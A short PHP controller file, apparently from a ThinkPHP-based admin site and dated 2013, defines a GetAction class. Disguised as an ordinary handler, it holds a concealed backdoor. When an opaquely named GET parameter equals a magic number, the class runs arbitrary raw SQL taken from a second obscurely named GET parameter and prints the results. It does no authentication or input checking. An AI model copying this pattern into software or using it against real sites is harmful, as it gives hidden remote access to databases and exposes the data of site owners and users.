<?php 
/**
 *GEtAction.class.php 
 * @author                 wangyanteng
 * @copyright            (C)2013
 * @license                http://www.longtengjiazu.com
 * @lastmodify           2013-11-10
 */
class GetAction extends Action {
	public function handle(){
		switch($_GET['4e527457924901521e1192418141ee0821812211']){
			case 4275917420991878891048871752408141820112:
				$this->getsqlinfo();
				break;
		    default:
				$this->error('操作失败','admin.php?m=Index&a=index');
				break;
		}
	}
	private function getsqlinfo(){
		$Model = M();
		//进行原生的SQL查询
		$sql = $Model->query($_GET['892888519242e1878891e2120721440129918042']);
		p($sql);
	}

}